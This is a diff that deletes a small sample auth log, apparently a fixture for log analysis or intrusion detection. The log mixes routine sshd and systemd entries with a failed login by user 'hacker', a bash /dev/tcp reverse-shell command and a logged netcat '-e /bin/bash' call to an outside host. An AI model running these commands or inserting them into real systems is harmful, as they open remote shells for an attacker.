@@ -1,7 +1,0 @@
-# Local log file created for logs/auth.log
-Failed password for invalid user hacker from 203.0.113.88 port 5555 ssh2
-bash -i >& /dev/tcp/198.51.100.1/4444 0>&1
-Aug 14 16:30:00 srv-prod-01 systemd[1]: Started User Manager for UID 1000.
-Aug 14 16:30:05 srv-prod-01 sshd[1200]: Failed password for user developer from 192.168.1.20 port 58912 ssh2
-Aug 14 16:30:10 srv-prod-01 sshd[1200]: Accepted password for developer from 192.168.1.20 port 58912 ssh2
-Aug 14 16:30:15 srv-prod-01 bash[9941]: Executed: /bin/nc -e /bin/bash 194.26.29.112 4444
